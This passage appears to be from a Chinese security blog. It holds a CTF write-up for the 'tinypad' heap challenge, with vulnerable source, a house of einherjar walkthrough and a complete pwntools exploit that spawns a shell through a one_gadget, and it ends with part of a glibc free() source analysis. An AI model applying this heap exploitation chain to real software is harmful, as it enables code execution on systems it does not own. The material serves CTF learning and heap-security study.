a1[len - 1] != &#39;\n&#39; )    dummyinput(terminate);  return i;&#125;</code></pre><p>通过分析程序，我们不难看出，这个程序的基本功能是操作一个 tinypad，主要有以下操作</p><ul><li>开头，程序每次开头依次判断每个 memo 的指针来判断是否为空，如果不为空，进而利用 strlen 求得其相应的长度，将 memo 的内容输出。从这里，我们也可以看出最多有 4 个 memo。</li><li>添加 memo，遍历存储 memo 的变量tinypad，根据 tinypad 的存储的大小判断 memo 是否在使用，然后还有的话，分配一个 memo。从这里我们可以知道，程序只是从 tinypad 起始偏移16*16&#x3D;256 处才开始使用，每个 memo 存储两个字段，一个是该 memo 的大小，另一个是该 memo 对应的指针。所以我们可以创建一个新的结构体，并修改 ida 识别的 tinypad，使之更加可读（但是其实 ida 没有办法帮忙智能识别。）。同时，由于该添加功能依赖于读取函数，所以存在 off by one 的漏洞。此外，我们可以看出，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致。</li><li>删除，根据存储 memo 的大小判断 memo 是否在被使用，同时将相应 memo 大小设置为0，但是并没有将指针设置为 NULL，有可能会导致 Use After Free。即在程序开头时，就有可能输出一些相关的内容，这其实就是我们泄漏一些基地址的基础。</li><li>编辑。在编辑时，程序首先根据之前存储的 memo 的内容将其拷贝到 tinypad 的前 256 个字节中（buffer），但正如我们之前所说的，当 memo 存储了 256 个字节时，就会存在 off by one漏洞。与此同时，程序利用 strlen 判断复制之后的 tinypad 的内容长度，并将其输出。之后程序继续利用 strlen 求得 memo 的长度，并读取指定长度内容到 tinypad 中，根据读取函数，这里必然出现了 \x00。最后程序将读取到 tinypad 前 256 字节的内容放到对应 memo 中。</li></ul><p>主要的数据结构有：</p><pre><code class="c_cpp">struct &#123;    char buffer[0x100]; // make a fakechunk.    struct &#123;        size_t size;        char *memo;    &#125; page[4];&#125; tinypad;</code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>这里只是附上源代码方便理解，按常理来说应该只能对可执行程序进行ida反汇编，详细的文件可以在CTF wiki的house of einherjar查看下载。</p><pre><code class="c_cpp">#include &lt;ctype.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &quot;pwnio.h&quot;#define PADSIZE         0x4const char title[] = &quot;  ============================================================================\n&quot;                     &quot;// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n&quot;                     &quot;||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n&quot;                     &quot;||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n&quot;                     &quot;||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n&quot;                     &quot;\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n&quot;                     &quot;  ============================================================================\n&quot;;const char separator[] = &quot;+------------------------------------------------------------------------------+\n&quot;;const char menu[] = &quot;+- MENU -----------------------------------------------------------------------+\n&quot;                    &quot;| [A] Add memo                                                                 |\n&quot;                    &quot;| [D] Delete memo                                                              |\n&quot;                    &quot;| [E] Edit memo                                                                |\n&quot;                    &quot;| [Q] Quit                                                                     |\n&quot;                    &quot;+------------------------------------------------------------------------------+\n&quot;;const char show_index[] = &quot; #   INDEX: &quot;;const char show_content[] = &quot; # CONTENT: &quot;;const char confirm_content[] = &quot;CONTENT: &quot;;const char prompt_cmd[] = &quot;(CMD)&gt;&gt;&gt; &quot;;const char prompt_size[] = &quot;(SIZE)&gt;&gt;&gt; &quot;;const char prompt_content[] = &quot;(CONTENT)&gt;&gt;&gt; &quot;;const char prompt_index[] = &quot;(INDEX)&gt;&gt;&gt; &quot;;const char prompt_confirm[] = &quot;(Y/n)&gt;&gt;&gt; &quot;;const char errmsg_no_space_left[] = &quot;No space is left.&quot;;const char errmsg_no_such_command[] = &quot;No such a command&quot;;const char errmsg_invalid_index[] = &quot;Invalid index&quot;;const char errmsg_not_used[] = &quot;Not used&quot;;const char syserr_no_memory_is_available[] = &quot;[!] No memory is available.&quot;;const char syserr_init_failed[] = &quot;[!] Init failed.&quot;;const char msg_confirm[] = &quot;Is it OK?&quot;;const char msg_timeout[] = &quot;Timeout.&quot;;const size_t memo_maxlen = 0x100;struct &#123;    char buffer[0x100]; // make a fakechunk.    struct &#123;        size_t size;        char *memo;    &#125; page[4];&#125; tinypad;static inline void dummyinput(int c)&#123;    if(!c) return;    char dummy = &#39;\0&#39;;    while(dummy != c)         read_n(&amp;dummy, 1);&#125;int getcmd()&#123;    int cmd = &#39;\0&#39;;    write_n(menu, strlen(menu));    write_n(prompt_cmd, strlen(prompt_cmd));     read_until((char *)&amp;cmd, 1, &#39;\n&#39;);    write_n(&quot;\n&quot;, 1);    return toupper(cmd);&#125;int main()&#123;    int cmd = &#39;\0&#39;;    write_n(&quot;\n&quot;, 1);    write_n(title, strlen(title));    write_n(&quot;\n&quot;, 1);    do&#123;        for(int i = 0; i &lt; PADSIZE; i++) &#123;            char count = &#39;1&#39;+i;            writeln(separator, strlen(separator));            write_n(show_index, strlen(show_index)); writeln(&amp;count, 1);            write_n(show_content, strlen(show_content));            if(tinypad.page[i].memo) &#123;                writeln(tinypad.page[i].memo, strlen(tinypad.page[i].memo));            &#125;            writeln(&quot;\n&quot;, 1);        &#125;        int idx = 0;        switch(cmd = getcmd()) &#123;            case &#39;A&#39;: &#123;                    while(idx &lt; PADSIZE &amp;&amp; tinypad.page[idx].size != 0) idx++;                    if(idx == PADSIZE) &#123;                        writeln(errmsg_no_space_left, strlen(errmsg_no_space_left));                        break;                    &#125;                    int size = -1;                    write_n(prompt_size, strlen(prompt_size));                     size = read_int();                    size =  (size &lt;    0x1)? 0x1:                            (size &lt;  memo_maxlen)? size: memo_maxlen;                    tinypad.page[idx].size = size;                    if((tinypad.page[idx].memo = malloc(size)) == NULL) &#123;                        writerrln(&quot;[!] No memory is available.&quot;, strlen(&quot;[!] No memory is available.&quot;));                        _exit(-1);                    &#125;                    write_n(prompt_content, strlen(prompt_content));                    read_until(tinypad.page[idx].memo, size, &#39;\n&#39;);                    writeln(&quot;\nAdded.&quot;, strlen(&quot;\nAdded.&quot;));                &#125; break;            case &#39;D&#39;: &#123;                    write_n(prompt_index, strlen(prompt_index));                    idx = read_int();                    if(!(0 &lt; idx &amp;&amp; idx &lt;= PADSIZE)) &#123;                        writeln(errmsg_invalid_index, strlen(errmsg_invalid_index));                        break;                    &#125;                    if(tinypad.page[idx-1].size == 0) &#123;                        writeln(errmsg_not_used, strlen(errmsg_not_used));                        break;                    &#125;                    // XXX: UAF                    free(tinypad.page[idx-1].memo);                    tinypad.page[idx-1].size = 0;                    writeln(&quot;\nDeleted.&quot;, strlen(&quot;\nDeleted.&quot;));                &#125; break;            case &#39;E&#39;: &#123;                    write_n(prompt_index, strlen(prompt_index));                    idx = read_int();                    if(!(0 &lt; idx &amp;&amp; idx &lt;= PADSIZE)) &#123;                        writeln(errmsg_invalid_index, strlen(errmsg_invalid_index));                        break;                    &#125;                    if(tinypad.page[idx-1].size == 0) &#123;                        writeln(errmsg_not_used, strlen(errmsg_not_used));                        break;                    &#125;                    int confirmation = &#39;0&#39;;                    strcpy(tinypad.buffer, tinypad.page[idx-1].memo);                    while(toupper(confirmation) != &#39;Y&#39;) &#123;                        write_n(confirm_content, strlen(confirm_content));                        writeln(tinypad.buffer, strlen(tinypad.buffer));                        write_n(prompt_content, strlen(prompt_content));                        // XXX: Not NUL Terminated.                        read_until(tinypad.buffer, strlen(tinypad.page[idx-1].memo), &#39;\n&#39;);                        writeln(msg_confirm, strlen(msg_confirm));                        write_n(prompt_confirm, strlen(prompt_confirm));                        read_until((char *)&amp;confirmation, 1, &#39;\n&#39;);                    &#125;                    strcpy(tinypad.page[idx-1].memo, tinypad.buffer);                    writeln(&quot;\nEdited.&quot;, strlen(&quot;\nEdited.&quot;));                &#125; break;            default:                writeln(errmsg_no_such_command, strlen(errmsg_no_such_command));            case &#39;Q&#39;:                break;        &#125;    &#125; while(cmd != &#39;Q&#39;);    return 0;&#125;</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先程序存在两个漏洞：<strong>UAF</strong>和<strong>house of einherjar</strong>。</p><p>程序增删改通过info-&gt;size 判断是否存在，而<strong>查</strong>通过info-&gt;data，且Delete只删除size，不删除data，所以被释放的memo内容仍会被打印，导致信息泄露。</p><p>主要思路如下：</p><ol><li>信息泄露：通过UAF泄露堆地址和libc的基地址，比如这里free两个chunk，A和B，A的fd会存放B的地址，即堆地址，B的fd会存放small bin的地址，即为libc地址。</li><li>利用house of einherjar在tinypad的buffer伪造chunk，以获取buffer后四个memo数组的指针和内容。</li><li>这时就可以考虑如何处罚one_gadget，这题开启了full relro保护，所以无法修改GOT表；那么就考虑malloc_hook，这题的edit修改会首先通过strcpy复制原内容到buffer，然后strlen判断原长度以进行再次编辑，malloc_hook初始时为0，行不通。这里考虑修改程序的main函数返回地址为OGG，直接就需要一个stack地址了，而_environ全局变量保存了一个指向栈的地址，而environ会在libc中导出，第一步中已经知道了libc基地址，所以就之后就顺理成章了。</li></ol><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><ol><li>泄露信息</li></ol><pre><code class="python">def leak_heap_libc():    global heap_base, libc_base    add(0xe0, &quot;A&quot; * 0x10) #A    add(0xf0, &quot;A&quot; * 0xf0) #B    add(0x100, &quot;A&quot; * 0x10) #C    add(0x100, &quot;A&quot; * 0x10) #D    delete(3)    delete(1)    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)    heap_base = u64(io.recvn(4).ljust(8, b&quot;\x00&quot;)) - (0x100 + 0xf0)    log.info(&quot;heap base: 0x%x&quot; % heap_base)    io.recvuntil(&quot;INDEX: 3\n # CONTENT: &quot;)    libc_base = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;)) - 0x3c4b78    log.info(&quot;libc base: 0x%x&quot; % libc_base)</code></pre><p>如下图所示，此时freeA和C，A中的fd为0xe581f0——chunk C的地址，C的fd为0x7fef7a849b78，为libc</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350151706aec114119eb1900a23b37fce07429a40.png"></p><ol start="2"><li>house of einherjar</li></ol><pre><code class="python">def house_of_einherjar():    delete(4)                                # move top chunk    fake_chunk1  = b&quot;A&quot; * 0xe0    fake_chunk1 += p64(heap_base + 0xf0 -tinypad)    # prev_size    add(0xe8, fake_chunk1)                    # null byte overflow    fake_chunk2  = p64(0x100)                        # prev_size    fake_chunk2 += p64(heap_base + 0xf0 - tinypad)    # size    fake_chunk2 += p64(0x602040) * 4                # fd, bk    edit(2, fake_chunk2)    delete(2)                                # consolidate</code></pre><p>上述操作将B的prev_size覆盖为(heap_base + 0xf0 -tinypad)，之后再将其free后，变进行unlink，先和fake chunk，后和top chunk。</p><p>其中此时(heap_base + 0xf0 -tinypad) &#x3D; 0x13b7fc1，可以看到在tinypad构造的fake chunk中的size也为该大小。</p><p>此时fake chunk成为了new top chunk。</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853501812894dcfd61d6a6f2a43f7a3899b67bdf7fd.png"></p><ol start="3"><li>泄露stack</li></ol><pre><code class="python">def leak_stack():    global stack_addr    environ_addr = libc_base + libc.symbols[&quot;__environ&quot;]    payload  = p64(0xe8) + p64(environ_addr)        # tinypad1    payload += p64(0xe8) + p64(tinypad + 0x108)    # tinypad2    add(0xe0, &quot;A&quot; * 0xe0)    add(0xe0, payload)    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)    stack_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))    log.info(&quot;stack address: 0x%x&quot; % stack_addr)</code></pre><p>这里申请两个chunk，第二个chunk覆盖了page[4]数组的空间，放入伪造的tinypad1和tinypad2，分别放如environ和tinypad+0x108的地址,（tinypad+0x108&#x3D;0x602148)指向tinypad1的memo指针，也就是这里存放environ地址的地方，回想一下tinypad的struct。</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350202998e92ca21dc1883467cc342b6d59c3eb37.png"></p><ol start="4"><li>修改返回地址</li></ol><pre><code class="python">def pwn():    one_gadget = libc_base + 0x45216    edit(2, p64(stack_addr - 0xf0))            # return address    edit(1, p64(one_gadget))    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;Q&#39;)    io.interactive()</code></pre><p><code>edit(2, p64(stack_addr - 0xf0))</code>，程序会找到指向memo内容的指针，也就是这里伪造的environ地址，并且修改内容为返回地址。</p><p><code>edit(1, p64(one_gadget))</code>，此时，page[0]，也就是我们伪造的tinypad1，原本存放的environ地址已经被上一句命令改为返回地址，所以该命令会取出返回地址，放入我们的one_gadget，之后退出即可触发。</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350221906f4a2ca754e593ce44d51e5062855a87e.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *io = process(&#39;./tinypad&#39;)libc = ELF(&#39;libc.so.6&#39;)tinypad = 0x602040def add(size, content):    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;A&#39;)    io.sendlineafter(&quot;(SIZE)&gt;&gt;&gt; &quot;, str(size))    io.sendlineafter(&quot;(CONTENT)&gt;&gt;&gt; &quot;, content)def delete(idx):    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;D&#39;)    io.sendlineafter(&quot;(INDEX)&gt;&gt;&gt; &quot;, str(idx))def edit(idx, content):    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;E&#39;)    io.sendlineafter(&quot;(INDEX)&gt;&gt;&gt; &quot;, str(idx))    io.sendlineafter(&quot;(CONTENT)&gt;&gt;&gt; &quot;, content)    io.sendlineafter(&quot;(Y/n)&gt;&gt;&gt; &quot;, &#39;Y&#39;)def leak_heap_libc():    global heap_base, libc_base    add(0xe0, &quot;A&quot; * 0x10)    add(0xf0, &quot;A&quot; * 0xf0)    add(0x100, &quot;A&quot; * 0x10)    add(0x100, &quot;A&quot; * 0x10)    delete(3)    delete(1)    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)    heap_base = u64(io.recvn(4).ljust(8, b&quot;\x00&quot;)) - (0x100 + 0xf0)    log.info(&quot;heap base: 0x%x&quot; % heap_base)    io.recvuntil(&quot;INDEX: 3\n # CONTENT: &quot;)    libc_base = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;)) - 0x3c4b78    log.info(&quot;libc base: 0x%x&quot; % libc_base)def house_of_einherjar():    delete(4)                                # move top chunk    fake_chunk1  = b&quot;A&quot; * 0xe0    fake_chunk1 += p64(heap_base + 0xf0 -tinypad)    # prev_size    add(0xe8, fake_chunk1)                    # null byte overflow    fake_chunk2  = p64(0x100)                        # prev_size    fake_chunk2 += p64(heap_base + 0xf0 - tinypad)    # size    fake_chunk2 += p64(0x602040) * 4                # fd, bk    edit(2, fake_chunk2)    delete(2)                                # consolidatedef leak_stack():    global stack_addr    environ_addr = libc_base + libc.symbols[&quot;__environ&quot;]    payload  = p64(0xe8) + p64(environ_addr)        # tinypad1    payload += p64(0xe8) + p64(tinypad + 0x108)    # tinypad2    add(0xe0, &quot;A&quot; * 0xe0)    add(0xe0, payload)    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)    stack_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))    log.info(&quot;stack address: 0x%x&quot; % stack_addr)def pwn():    one_gadget = libc_base + 0x45216    edit(2, p64(stack_addr - 0xf0))            # return address    edit(1, p64(one_gadget))    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;Q&#39;)    io.interactive()&quot;&quot;&quot;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:&quot;&quot;&quot;leak_heap_libc()house_of_einherjar()leak_stack()pwn()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/05/13/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_free/"/>
      <url>/2023/05/13/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_free/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这部分内部比较少，但是在堆漏洞中也是关键的环节，我将继续采用Cataloc师傅的分析方式，在Cataloc师傅的基础上加上自己的理解。</p><h1 id="libc-free主流程"><a href="#libc-free主流程" class="headerlink" title="_libc_free主流程"></a>_libc_free主流程</h1><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/libc_free_1.png"></p><ul><li><p><strong>红色方框</strong>：</p><p>这部分是针对 hook 函数的处理，若存在则调用 hook 函数并返回；从 <strong>glibc2.34</strong> 版本开始，此处的 hook 处理已被删除</p></li><li><p><strong>橙色方框</strong>：</p><p>第一处判断 <code>mem == 0</code>，实际上是对 <code>free(0)</code> 情况的处理吗，直接返回；</p><p>接下来调用宏 <code>mem2chunk</code> 将需要被 free 的指针转换为 chunk 的首地址。</p></li><li><p><strong>蓝色方框</strong>：</p><p>这部分主要是进行映射内存（mapped memory，即通过 <code>mmap()</code> 系统调用申请的内存）释放的处理，若开启了 <code>mmap()</code> <strong>分配阈值动态调整机制（no_dyn_threshold 值为 0）</strong>，则会根据 释放的内存大小动态调整 <strong>mmap 分配阈值（mmap_threshold）与 top chunk 的收缩阈值（trim_threshold）</strong></p><p>多提一嘴，这里也是一个可利用的点，在how2heap的中<strong>mmap_overlapping_chunks</strong>中，便是利用了mmap_threshold，我之后也会跟着Cataloc师傅的how2heap分析出一个Blog。</p></li><li><p><strong>绿色方框</strong>：</p><p>先调用 <code>MAYBE_INIT_TCACHE</code> 判断 tcache 是否存在，若不存在则进行 tcache 初始化，调用 <code>arena_for_chunk</code> 获取需要释放的 chunk 所在的分配区，然后调用 <code>_int_free()</code> 完成对该 chunk 的释放，此时传入的参数 p 为需要释放的 chunk。</p></li></ul><h1 id="int-free-主流程"><a href="#int-free-主流程" class="headerlink" title="_int_free 主流程"></a>_int_free 主流程</h1><h2 id="初始校验"><a href="#初始校验" class="headerlink" title="初始校验"></a>初始校验</h2><p><code>_int_free()</code> 有 3 个参数，<code>av</code> 是 chunk 所在的分配区，<code>p</code> 是 chunk 的首地址，<code>have_lock</code> 是个锁标志，默认为 0。</p><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/int_free_1.png"></p><ul><li><strong>check 1：</strong><ul><li><code>(int(p) &gt; int(-size)) == 0</code>，翻译过来就是 chunk 的地址不能比负的 size 大，size 往往是一个相对较小的数，例如 0x20，取负后就会变成一个很大的数，例如 0xffffffE0，在 Linux 进程地址空间中，这样的地址属于内核地址，若 chunk 地址在这个范围，很可能是被覆盖了，因此会进行报错处理</li><li><code>misalinged_chunk</code>简化后为<code>chunk2mem(p) &amp; 0xf == 0</code>，这里就是检验是否对齐。0xf 实际上是 <code>SIZE_SZ * 2 - 1</code> 的结果，这个值在 64 位下就是 0xf。经过 chunk2mem 则是获取原本指针的值，这个值经过 <code>chunk地址 + 2*SIZE_SZ</code> 计算的结果，而 chunk 地址本身是按照 <code>SIZE_SZ*2</code> 进行对齐的，因此经过 <code>chunk2mem</code> 计算后的地址，也应该是按照 <code>SIZE_SZ*2</code> 对齐的，那么该值在和 0xf 进行与运算时，得到的结果应该为 0，若不为 0，说明 chunk 地址未对齐，则应报错</li></ul></li><li><strong>check 2：</strong><ul><li><code>size &lt; MINSIZE</code>，将要释放的 chunk 大小比 chunk 最小分配的大小 MINSIZE 还要小，显然是出错了</li><li><code>aligned_OK(size) == 0</code>，这个和上面的 check 类似，只不过这个是对 size 的对齐进行 check，上面那个是对 chunk 地址对齐进行 check</li></ul></li><li><strong>check 3：</strong><ul><li><code>check_inuse_chunk</code>，这个宏会进一步调用<code>do_check_inuse_chunk()</code>，该函数会检查 chunk 是否为正在使用的，即检查该 chunk 的后一块的 prev_inuse 位进行判断，防止 double free 的情况发生。</li><li>这里再提一嘴，之后how2heap中，有一个很简单的例子，fastbin_dup中就是利用了double free，不过例子中使用的是fastbin，所有chunk的prev_inuse默认置1，因为这是为了防止被合并，所以这个地方就直接绕过了。</li></ul></li></ul><h2 id="Tcache-处理流程"><a href="#Tcache-处理流程" class="headerlink" title="Tcache 处理流程"></a>Tcache 处理流程</h2><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/tcache_free_1.png"></p><ul><li><p><strong>外层 check：</strong></p><ol><li>判断 tcache 是否已初始化</li><li>判断 tc_idx 是否在 tcache bin 数目的范围内（tcache bin 最多有 64 个，因此经过 <code>csize2tidx</code> 计算得到的值应小于 64）</li></ol><p>若满足上述两个条件，则调用 <code>chunk2mem</code> 获取这个将要被 free 掉的 chunk 的mem部分，且以 tcache_entry的结构存放到新变量中，为什么要这么做？<strong>因为 tcache_entry 本身就是 malloc_chunk 结构体，当 chunk 进入 tcache bin 中后，它使用了 malloc_chunk 结构体的 fd&#x2F;bk 两个字段</strong>。</p></li><li><p><strong>内层第一个 check：</strong></p><ol><li>判断 e-&gt;key 是否等于 tcache 首地址</li></ol><p>在通过 <code>tcache_put()</code> 将 chunk 放入 tcache bin 的过程中，会将 chunk 对应的 bk 字段（即 tcache_entry-&gt;key 字段）设置为 tcache 的首地址，<strong>这里若相等，说明该 chunk 可能已经进入 tcache bin 中，若继续释放可能会造成 double free</strong>。不过这里为了排除因为随机有效载荷的干扰，会进一步遍历该 tc_idx 对应的 tcache bin 上的所有 chunk，判断是否与当前将要释放的 chunk 相等，来确保结果的严谨。</p></li><li><p><strong>内层第二个 check：</strong></p><p>判断 tc_idx 对应的 tcache bin 中 chunk 的数量是否小于最大值。</p><p>tcache bin 中最多包含 7 个相同大小的 chunk，若当前 tcache bin 中 chunk 的数量低于 7 个，那么 free 掉该大小的 chunk 就会进入该 tcache bin 中。这里若能通过该判断，则会调用 <code>tcache_put()</code> 将 chunk 放入该 tc_idx 对应的 tcache bin 中。</p></li></ul><h2 id="Fast-bin处理流程"><a href="#Fast-bin处理流程" class="headerlink" title="Fast bin处理流程"></a>Fast bin处理流程</h2><h3 id="check"><a href="#check" class="headerlink" title="check"></a>check</h3><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/fastbin_check.png"></p><ul><li><p><strong>外层 check：</strong></p><ol><li>要 free 的 chunk 的大小是否位于 fast bin 范围内</li><li>开启了 TRIM_FASTBINS 模式下（默认为 0，不开启），则该 chunk 不能紧挨着 top chunk</li></ol><p>满足上述条件，则进入 fast bin 处理流程</p></li><li><p><strong>内层 check：</strong></p><ol><li>chunk 小于 2*SIZE_SZ</li><li>chunk 大于 system_mem</li></ol><p><strong>这个地方有些许疑惑，为什么size的下限是2*size_sz而不是minsize，而且第一个比较获取的是未对齐的mchunk_size，第二个是经过与运算去掉N、M和P位的mchunk_size。</strong></p><p>这俩属于对于 size 的常规检测，之前的分析中已经多次遇到。只是这里它处理的会更严谨些，<strong>为了排除多线程的干扰，会给 chunk 所属的分配区上锁后，重新进行一次判断</strong>，若这次判断还是出问题，则说明 size 确实是个非法的值，然后报错退出。</p></li></ul><h3 id="free部分"><a href="#free部分" class="headerlink" title="free部分"></a>free部分</h3><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/fastbin_free.png"></p><ol><li><code>free_perturb()</code> 实现了一个 <code>memset</code> 操作，前提是需要设置用于填充缓冲区的值 perturb_byte，该值默认为 0，故不会进行 <code>memset</code> 操作，所以这里可以忽略</li><li><code>atomic_store_relaxed()</code> 默认fastchunk 是false的，没有被初始化的，该操作会将av-&gt;have_fastchunks变量的值设置为true。这个变量用来标记当前堆内存中是否存在fastbin</li><li>接下来拿到<strong>要被 free 的 chunk 在 fast bin 中的 idx</strong> 以及<strong>对应 bin 的链表头</strong>，然后开始进入 fast bin：<ul><li>对于单线程的情况，直接用头插法将 chunk 放到链表头所指向的位置，到时候分配的时候，也是优先分配这个位置，因此 fast bin 是先进后出（FILO）</li><li>对于多线程的情况，则是通过 lock-free 的技术实现单向链表链入第一个 node 的操作，本质上和单线程的处理方式一致</li><li>上述两种情况，都会根据链入的 chunk 和原先该位置的 chunk 是否一致，来判断是否出现 double free 的情形</li></ul></li><li>最后有一个 check，判断我们插入的 chunk 与原先顶部的 chunk 大小是否一致，因为 fast bin 要求每条 bin 上的 chunk 大小相同。不过这个 check 仅在分配区上锁的情况下才会进行</li></ol><h2 id="Bins-处理流程"><a href="#Bins-处理流程" class="headerlink" title="Bins 处理流程"></a>Bins 处理流程</h2><h3 id="check-部分"><a href="#check-部分" class="headerlink" title="check 部分"></a>check 部分</h3><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/non_fastbin_check.png"></p><ol><li><p>这里的 else if 对应前面 fast bin 判断处的 if 以及最末尾处的一个 else，逻辑如下：</p><ul><li><strong>if：</strong> 在 fast bin 范围内，进入 fast bin 处理流程</li><li><strong>else if：</strong> 不是通过 <code>mmap()</code> 系统调用申请的内存，则进入 bins 处理流程（unsorted bin，small bin，large bin 都位于 bins 中）</li><li><strong>else：</strong> 直接调用 <code>munmap_chunk()</code> 释放 chunk</li></ul></li><li><p>进入 else if 语句，开始会对单线程 &#x2F; 多线程进行判断，如果是多线程的场景，需要对分配区进行加锁。然后通过 <code>chunk_at_offset</code> 获取到后一个 chunk 的地址</p></li><li><p>接下来是一系列 check：</p><ul><li><p><strong>check 1：</strong></p><p><code>p == top chunk</code>，top chunk 只会被分割，不会处于 inuse 状态，若 free 的是 top chunk，说明出错了</p></li><li><p><strong>check 2：</strong></p><ul><li><code>contiguous(av)</code>，检查分配区上的 flags，在malloc_state结构体中有一个变量为flags，其中有一位表示<code>NONCONTIGUOUS_BIT</code>，用来表示内存的连续性。</li><li><code>nextchunk...</code>，下面这个校验太长了就不写了，主要是判断 nextchunk 的首地址，是否超过了 top chunk 的边界，若超过了，说明要被 free 的 chunk 自身的数据区也超过了 top chunk 的范围，也就出错了</li></ul></li><li><p><strong>check 3：</strong></p><p><code>prev_inuse(nextchunk) == 0</code>，这个就是判断自己是不是在使用中，因为此时还没进行 free，nextchunk 的 prev_inuse 应该设置为 1，若该值为 0，说明这个 chunk 已经是 free 状态了，就可能造成 double free</p></li><li><p><strong>check 4：</strong></p><p>这里主要是对 nextchunk 的 size 进行 check，前文已多次出现，目的是防止在向后合并时出现问题</p></li></ul></li><li><p>最后调用 <code>free_perturb()</code> 进行 <code>memset</code>，当然，还是大概率不会执行</p></li></ol><h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/consolidate_backward.png"></p><p>这里的逻辑是<strong>尝试（当前一个 chunk 处于 free 状态时就会进行合并</strong>）将当前 chunk 与前一个 chunk 进行合并：</p><ol><li>通过当前 chunk 拿到 prevsize</li><li>将当前 chunk 的 size 与 prevsize 相加</li><li>将当前 chunk 的首地址设置为前一个 chunk 的首地址，这样就相当于合并了，不过<strong>此时还没有修改合并后 chunk 的 size 字段</strong></li><li>检查一下前一个 chunk 合并前的大小</li><li>调用 <code>unlink_chunk()</code> 将前一个 chunk 从链表（bins 上的链表都有可能）上断链，最后再注意一点，<strong>若发生了合并，此时的当前块，已经为合并后的 chunk，但是该 chunk 的 size 字段此时暂未修改</strong>。</li></ol><h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><p><img src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/consolidate_forward.png"></p><p>首先先判断后一个块是不是 top chunk：</p><ul><li>如果是，进入 else 语句，<strong>直接修改当前块为 top chunk，然后设置 top chunk 的 size 为合并后的 size，设置分配区的指向新的 top chunk 地址</strong></li><li>如果不是，那么判断一下 nextchunk 是否是 inuse 的：<ol><li>如果是 inuse 的，那么将 nextchunk 的 prev_inuse 设置为 0，意思是不合并 nextchunk 了，并告诉 nextchunk 你前面的块是 free 的</li><li>如果不是 inuse 的，将 nextchunk 断链，然后将 nextsize 加到 size 上，表示 nextchunk 也要加入合并</li><li>接下来，<strong>将合并后的 chunk 链入到 unsorted bin 中</strong>，并根据情况设置 size，prev_size，fd_nextsize，bk_nextsize 等字段</li></ol></li></ul><h3 id="堆收缩"><a href="#堆收缩" class="headerlink" title="堆收缩"></a>堆收缩</h3><p><img 